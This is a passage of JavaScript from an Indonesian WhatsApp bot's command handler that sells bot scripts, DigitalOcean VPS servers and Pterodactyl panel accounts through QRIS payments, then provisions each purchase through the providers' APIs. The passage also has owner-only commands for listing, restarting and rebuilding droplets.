return m.reply(example("6285###"));
let input;
if (m.quoted) {
input = m.quoted.sender;
} else if (m.mentionedJid && m.mentionedJid.length > 0) {
input = m.mentionedJid[0];
} else {
input = text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
}
const input2 = input.split("@")[0];
if (input2 === global.owner || input === botNumber) {
return m.reply(`Tidak bisa menghapus owner!`);
}
if (!premium.includes(input)) {
return m.reply(`Nomor ${input2} bukan reseller!`);
}
premium.splice(premium.indexOf(input), 1);
fs.writeFileSync("./library/database/premium.json", JSON.stringify(premium, null, 2));
m.reply(`Berhasil menghapus reseller ✅`);
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "buyscript": case "buysc": {
if (m.isGroup) return Reply("Pembelian script hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return Reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
if (!text) return ZakzzDev.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Script Bot',
          sections: [
            {
              title: 'List Script Bot WhatsApp',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Script AlwaysZakzz V4', 
                  description: "Rp15.000", 
                  id: '.buysc 1'
                },
                {
                  title: 'Script AlwaysZakzz V5', 
                  description: "Rp25.000", 
                  id: '.buysc 2'
                },
                {
                  title: 'Script AlwaysZakzz V6', 
                  description: "Rp35.000", 
                  id: '.buysc 3'
                }
              ]
            }
          ]
        })
      }
      }
  ],
  footer: ` ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Script Bot Yang Tersedia\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
tek = text.toLowerCase()
let Obj = {}

    if (tek == "1") {
    Obj.file = "./source/media/script1.zip"
    Obj.harga = "15000"
    Obj.namaSc = "Script AlwaysZakzz V4"
    } else if (tek == "2") {
    Obj.file = "./source/media/script2.zip"
    Obj.harga = "25000"
    Obj.namaSc = "Script AlwaysZakzz V5"  
    } else if (tek == "3") {
    Obj.file = "./source/media/script3.zip"
    Obj.harga = "35000"
    Obj.namaSc = "AlwaysZakzz V6"  
    } else return
    
const UrlQr = global.qrisOrderKuota

const amount  = Number(Obj.harga) + generateRandomNumber(110, 250)
const get = await axios.get(`https://aanz-official.my.id/api/orkut/createpayment?apikey=${global.ZakzzDev}&amount=${amount}&codeqr=${UrlQr}`)
const teks3 = `
*乂 INFORMASI PEMBAYARAN*
  
 *ァ ID :* ${get.data.result.transactionId}
 *ァ Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *ァ Barang :* ${Obj.namaSc}
 *ァ Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *.batalbeli* untuk membatalkan
`
let msgQr = await ZakzzDev.sendMessage(m.chat, {
  footer: `© 2025 ${botname}`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.qrImageUrl}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
idDeposit: get.data.result.transactionId, 
amount: get.data.result.amount.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount == db.users[m.sender].saweria.amount) {
await ZakzzDev.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await ZakzzDev.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()
while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const resultcek = await axios.get(`https://aanz-official.my.id/api/orkut/cekstatus?apikey=${global.ZakzzDev}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`)
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
var orang = db.users[m.sender].saweria.chat
await ZakzzDev.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *ァ ID :* ${db.users[m.sender].saweria.idDeposit}
 *ァ Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *ァ Barang :* ${Obj.namaSc}
`}, {quoted: db.users[m.sender].saweria.msg})
await ZakzzDev.sendMessage(orang, {document: await fs.readFileSync(Obj.file), mimetype: "application/zip", fileName: Obj.namaSc}, {quoted: null})
await ZakzzDev.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "buyvps": {
if (m.isGroup) return Reply("Pembelian vps hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return Reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")

if (!text) return ZakzzDev.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Spesifikasi Vps',
          sections: [
            {
              title: 'List Ram Server Vps',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Ram 16 & Cpu 4', 
                  description: "Rp55.000", 
                  id: '.buyvps 4'
                },
                {
                  title: 'Ram 2 & Cpu 1', 
                  description: "Rp25.000", 
                  id: '.buyvps 1'
                },
                {
                  title: 'Ram 4 & Cpu 2', 
                  description: "Rp35.000", 
                  id: '.buyvps 2'
                },
                {
                  title: 'Ram 8 & Cpu 4', 
                  description: "Rp45.000", 
                  id: '.buyvps 3'
                }                       
              ]
            }
          ]
        })
      }
      }
  ],
  footer: ` ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Ram Server Vps Yang Tersedia\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
tek = text.toLowerCase()
let Obj = {}

    if (tek == "1") {
    Obj.images = "s-1vcpu-2gb"
    Obj.harga = "25000"
    } else if (tek == "2") {
    Obj.images = "s-2vcpu-4gb"
    Obj.harga = "35000"
    } else if (tek == "3") {
    Obj.imagess = "s-4vcpu-8gb"
    Obj.harga = "45000"
    } else if (tek == "4") {
    Obj.images = "s-4vcpu-16gb"
    Obj.harga = "55000"
    } else return Reply(teks)
    
const UrlQr = global.qrisOrderKuota

const amount  = Number(Obj.harga) + generateRandomNumber(110, 250)
const get = await axios.get(`https://aanz-official.my.id/api/orkut/createpayment?apikey=${global.ZakzzDev}&amount=${amount}&codeqr=${UrlQr}`)
const teks3 = `
*乂 INFORMASI PEMBAYARAN*
  
 *ァ ID :* ${get.data.result.transactionId}
 *ァ Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *ァ Barang :* Vps Digital Ocean
 *ァ Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *.batalbeli* untuk membatalkan
`
let msgQr = await ZakzzDev.sendMessage(m.chat, {
  footer: `© 2025 ${botname}`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.qrImageUrl}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
idDeposit: get.data.result.transactionId, 
amount: get.data.result.amount.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount == db.users[m.sender].saweria.amount) {
await ZakzzDev.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await ZakzzDev.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()
while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const resultcek = await axios.get(`https://aanz-official.my.id/api/orkut/cekstatus?apikey=${global.ZakzzDev}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`)
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
await ZakzzDev.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *ァ ID :* ${db.users[m.sender].saweria.idDeposit}
 *ァ Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *ァ Barang :* Vps Digital Ocean
`}, {quoted: db.users[m.sender].saweria.msg})
var orang = db.users[m.sender].saweria.chat
    let hostname = "#" + m.sender.split("@")[0]
    
    try {        
        let dropletData = {
            name: hostname,
            region: "sgp1", 
            size: Obj.images,
            image: 'ubuntu-20-04-x64',
            ssh_keys: null,
            backups: false,
            ipv6: true,
            user_data: null,
            private_networking: null,
            volumes: null,
            tags: ['T']
        };

        let password = await generateRandomPassword()
        dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

        let response = await fetch('https://api.digitalocean.com/v2/droplets', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': "Bearer " + global.apiDigitalOcean 
            },
            body: JSON.stringify(dropletData)
        });

        let responseData = await response.json();

        if (response.ok) {
            let dropletConfig = responseData.droplet;
            let dropletId = dropletConfig.id;

            // Menunggu hingga VPS selesai dibuat
            await Reply(`Memproses pembuatan vps...`);
            await new Promise(resolve => setTimeout(resolve, 60000));

            // Mengambil informasi lengkap tentang VPS
            let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
                method: 'GET',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': "Bearer " + global.apiDigitalOcean
                }
            });

            let dropletData = await dropletResponse.json();
            let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 
                ? dropletData.droplet.networks.v4[0].ip_address 
                : "Tidak ada alamat IP yang tersedia";

            let messageText = `VPS berhasil dibuat!\n\n`;
            messageText += `ID: ${dropletId}\n`;
            messageText += `IP VPS: ${ipVPS}\n`;
            messageText += `Password: ${password}`;

            await ZakzzDev.sendMessage(orang, { text: messageText });
        } else {
            throw new Error(`Gagal membuat VPS: ${responseData.message}`);
        }
    } catch (err) {
        console.error(err);
        Reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
    }
await ZakzzDev.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}

}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "buypanel": {
if (m.isGroup) return Reply("Pembelian panel pterodactyl hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return Reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
if (!text) return ZakzzDev.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Ram Panel',
          sections: [
            {
              title: 'List Ram Server Panel',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Ram Unlimited', 
                  description: "Rp11.000", 
                  id: '.buypanel unlimited'
                },
                {
                  title: 'Ram 1GB', 
                  description: "Rp1000", 
                  id: '.buypanel 1gb'
                },
                {
                  title: 'Ram 2GB', 
                  description: "Rp2000", 
                  id: '.buypanel 2gb'
                },
                {
                  title: 'Ram 3GB', 
                  description: "Rp3000", 
                  id: '.buypanel 3gb'
                },
                {
                  title: 'Ram 4GB', 
                  description: "Rp4000", 
                  id: '.buypanel 4gb'
                },      
                {
                  title: 'Ram 5GB', 
                  description: "Rp5000", 
                  id: '.buypanel 5gb'
                },       
                {
                  title: 'Ram 6GB', 
                  description: "Rp6000", 
                  id: '.buypanel 6gb'
                },
                {
                  title: 'Ram 7GB', 
                  description: "Rp7000", 
                  id: '.buypanel 7gb'
                },        
                {
                  title: 'Ram 8GB', 
                  description: "Rp8000", 
                  id: '.buypanel 8gb'
                },   
                {
                  title: 'Ram 9GB', 
                  description: "Rp9000", 
                  id: '.buypanel 9gb'
                },       
                {
                  title: 'Ram 10GB', 
                  description: "Rp10.000", 
                  id: '.buypanel 10gb'
                },                                       
              ]
            }
          ]
        })
      }
      }
  ],
  footer: `© 2025 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Ram Server Panel Yang Tersedia\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
let Obj = {}
let cmd = text.toLowerCase()
if (cmd == "1gb") {
Obj.ram = "1000"
Obj.disk = "1000"
Obj.cpu = "40"
Obj.harga = "1000"
} else if (cmd == "2gb") {
Obj.ram = "2000"
Obj.disk = "2000"
Obj.cpu = "60"
Obj.harga = "2000"
} else if (cmd == "3gb") {
Obj.ram = "3000"
Obj.disk = "3000"
Obj.cpu = "80"
Obj.harga = "3000"
} else if (cmd == "4gb") {
Obj.ram = "4000"
Obj.disk = "4000"
Obj.cpu = "100"
Obj.harga = "4000"
} else if (cmd == "5gb") {
Obj.ram = "5000"
Obj.disk = "5000"
Obj.cpu = "120"
Obj.harga = "5000"
} else if (cmd == "6gb") {
Obj.ram = "6000"
Obj.disk = "6000"
Obj.cpu = "140"
Obj.harga = "6000"
} else if (cmd == "7gb") {
Obj.ram = "7000"
Obj.disk = "7000"
Obj.cpu = "160"
Obj.harga = "7000"
} else if (cmd == "8gb") {
Obj.ram = "8000"
Obj.disk = "8000"
Obj.cpu = "180"
Obj.harga = "8000"
} else if (cmd == "9gb") {
Obj.ram = "9000"
Obj.disk = "9000"
Obj.cpu = "200"
Obj.harga = "9000"
} else if (cmd == "10gb") {
Obj.ram = "10000"
Obj.disk = "10000"
Obj.cpu = "220"
Obj.harga = "10000"
} else if (cmd == "unli" || cmd == "unlimited") {
Obj.ram = "0"
Obj.disk = "0"
Obj.cpu = "0"
Obj.harga = "11000"
} else return Reply(teks)

const UrlQr = global.qrisOrderKuota

const amount  = Number(Obj.harga) + generateRandomNumber(110, 250)

const get = await axios.get(`https://aanz-official.my.id/api/orkut/createpayment?apikey=${global.ZakzzDev}&amount=${amount}&codeqr=${UrlQr}`)

const teks3 = `
*乂 INFORMASI PEMBAYARAN*
  
 *ァ ID :* ${get.data.result.transactionId}
 *ァ Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *ァ Barang :* Panel Pterodactyl
 *ァ Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.
`
let msgQr = await ZakzzDev.sendMessage(m.chat, {
  footer: `© 2025 ${botname}`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.qrImageUrl}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
idDeposit: get.data.result.transactionId, 
amount: get.data.result.amount.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount == db.users[m.sender].saweria.amount) {
await ZakzzDev.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await ZakzzDev.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()

while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const resultcek = await axios.get(`https://aanz-official.my.id/api/orkut/cekstatus?apikey=${global.ZakzzDev}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`)
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
await ZakzzDev.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *ァ ID :* ${db.users[m.sender].saweria.idDeposit}
 *ァ Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *ァ Barang :* Panel Pterodactyl
`}, {quoted: db.users[m.sender].saweria.msg})
let username = crypto.randomBytes(4).toString('hex')
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return Reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domain + `/api/application/nests/${nestid}/eggs/` + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": Obj.ram,
"swap": 0,
"disk": Obj.disk,
"io": 500,
"cpu": Obj.cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return Reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang = db.users[m.sender].saweria.chat
var tekspanel = `*Data Akun Panel Kamu 📦*

*📡 ID Server (${server.id})* 
*👤 Username :* ${user.username}
*🔐 Password :* ${password}

*🌐 Spesifikasi Server*
* Ram : *${Obj.ram == "0" ? "Unlimited" : Obj.ram.split("").length > 4 ? Obj.ram.split("").slice(0,2).join("") + "GB" : Obj.ram.charAt(0) + "GB"}*
* Disk : *${Obj.disk == "0" ? "Unlimited" : Obj.disk.split("").length > 4 ? Obj.disk.split("").slice(0,2).join("") + "GB" : Obj.disk.charAt(0) + "GB"}*
* CPU : *${Obj.cpu == "0" ? "Unlimited" : Obj.cpu+"%"}*
* ${global.domain}

*Syarat & Ketentuan :*
* Expired panel 1 bulan
* Simpan data ini sebaik mungkin
* Garansi pembelian 15 hari (1x replace)
* Claim garansi wajib membawa bukti chat pembelian
`
await fs.writeFileSync("./akunpanel.txt", tekspanel)
await ZakzzDev.sendMessage(orang, {document: fs.readFileSync("./akunpanel.txt"), fileName: "akunpanel.txt", mimetype: "text/plain", caption: tekspanel}, {quoted: null})
await fs.unlinkSync("./akunpanel.txt")
await ZakzzDev.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}

}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "buyadp": {
if (m.isGroup) return Reply("Pembelian panel pterodactyl hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return Reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
let us = crypto.randomBytes(4).toString('hex')
let Obj = {}
Obj.harga = "12000" 
Obj.username = us
const UrlQr = global.qrisOrderKuota

const amount  = Number(Obj.harga) + generateRandomNumber(110, 250)
const get = await axios.get(`https://aanz-official.my.id/api/orkut/createpayment?apikey=${global.ZakzzDev}&amount=${amount}&codeqr=${UrlQr}`)
const teks3 = `
*乂 INFORMASI PEMBAYARAN*
  
 *ァ ID :* ${get.data.result.transactionId}
 *ァ Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *ァ Barang :* Admin Panel Pterodactyl
 *ァ Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *.batalbeli* untuk membatalkan
`
let msgQr = await ZakzzDev.sendMessage(m.chat, {
  footer: `© 2025 ${botname}`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.qrImageUrl}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
idDeposit: get.data.result.transactionId, 
amount: get.data.result.amount.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount == db.users[m.sender].saweria.amount) {
await ZakzzDev.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await ZakzzDev.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()

while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const resultcek = await axios.get(`https://aanz-official.my.id/api/orkut/cekstatus?apikey=${global.ZakzzDev}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`)
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
await ZakzzDev.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *ァ ID :* ${db.users[m.sender].saweria.idDeposit}
 *ァ Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *ァ Barang :* Admin Panel Pterodactyl
`}, {quoted: db.users[m.sender].saweria.msg})
let username = Obj.username
let email = username+"@gmail.com"
let name = capital(username)
let password = crypto.randomBytes(4).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return Reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var teks = `*Data Akun Admin Panel 📦*

*📡 ID User (${user.id})* 
*👤 Username :* ${user.username}
*🔐 Password :* ${password.toString()}
* ${global.domain}

*Syarat & Ketentuan :*
* Expired akun 1 bulan
* Simpan data ini sebaik mungkin
* Jangan asal hapus server!
* Ketahuan maling sc, auto delete akun no reff!
`
await fs.writeFileSync("./akunpanel.txt", teks)
await ZakzzDev.sendMessage(db.users[m.sender].saweria.chat, {document: fs.readFileSync("./akunpanel.txt"), fileName: "akunpanel.txt", mimetype: "text/plain", caption: teks}, {quoted: m})
await fs.unlinkSync("./akunpanel.txt")
await ZakzzDev.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}

}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "batalbeli": {
if (m.isGroup) return
if (db.users[m.sender].status_deposit == false) return 
db.users[m.sender].status_deposit = false
if ('saweria' in db.users[m.sender]) {
await ZakzzDev.sendMessage(m.chat, {text: "Berhasil membatalkan pembelian ✅"}, {quoted: db.users[m.sender].saweria.msg})
await ZakzzDev.sendMessage(m.chat, { delete: db.users[m.sender].saweria.msg.key })
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
} else {
return Reply("Berhasil membatalkan pembelian ✅")
}
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case 'listdroplet': {
if (!isCreator) return Reply(mess.owner)
try {
const getDroplets = async () => {
try {
const response = await fetch('https://api.digitalocean.com/v2/droplets', {
headers: {
Authorization: "Bearer " + global.apiDigitalOcean
}
});
const data = await response.json();
return data.droplets || [];
} catch (err) {
m.reply('Error fetching droplets: ' + err);
return [];
}
};

getDroplets().then(droplets => {
let totalvps = droplets.length;
let mesej = `List droplet digital ocean kamu: ${totalvps}\n\n`;

if (droplets.length === 0) {
mesej += 'Tidak ada droplet yang tersedia!';
} else {
droplets.forEach(droplet => {
const ipv4Addresses = droplet.networks.v4.filter(network => network.type === "public");
const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP!';
mesej += `Droplet ID: ${droplet.id}
Hostname: ${droplet.name}
Username: Root
IP: ${ipAddress}
Ram: ${droplet.memory} MB
Cpu: ${droplet.vcpus} CPU
OS: ${droplet.image.distribution}
Storage: ${droplet.disk} GB
Status: ${droplet.status}\n`;
});
}
ZakzzDev.sendMessage(m.chat, { text: mesej }, {quoted: m});
});
} catch (err) {
m.reply('Terjadi kesalahan saat mengambil data droplet: ' + err);
}
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case 'restartvps': {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("iddroplet"))
let dropletId = text
const restartVPS = async (dropletId) => {
try {
const apiUrl = `https://api.digitalocean.com/v2/droplets/${dropletId}/actions`;

const response = await fetch(apiUrl, {
method: 'POST',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.apiDigitalOcean}`
},
body: JSON.stringify({
type: 'reboot'
})
});

if (response.ok) {
const data = await response.json();
return data.action;
} else {
const errorData = await response.json();
m.reply(`Gagal melakukan restart VPS: ${errorData.message}`);
}
} catch (err) {
m.reply('Terjadi kesalahan saat melakukan restart VPS: ' + err);
}
};

restartVPS(dropletId)
.then((action) => {
m.reply(`Aksi restart VPS berhasil dimulai. Status aksi: ${action.status}`);
})
.catch((err) => {
m.reply(err);
})

}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case 'rebuild': {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("iddroplet"))
let dropletId = text 
let rebuildVPS = async () => {
try {
// Rebuild droplet menggunakan API DigitalOcean
const response = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}/actions`, {
method: 'POST',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.apiDigitalOcean}`
},
body: JSON.stringify({
type: 'rebuild',
image: 'ubuntu-22-04-x64' // Ganti dengan slug image yang ingin digunakan untuk rebuild (misal: 'ubuntu-18-04-x64')
})
});

if (response.ok) {
const data = await response.json();
m.reply('Rebuild VPS berhasil dimulai. Status aksi:', data.action.status);
const vpsInfo = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
method: 'GET',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.apiDigitalOcean}`
}
});
if (vpsInfo.ok) {
const vpsData = await vpsInfo.json();
const droplet = vpsData.droplet;
const ipv4Addresses = droplet.networks.v4.filter(network => network.type === 'public');
const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP!';

const textvps = `*VPS BERHASIL DI REBUILD*
IP VPS: ${ipAddress}
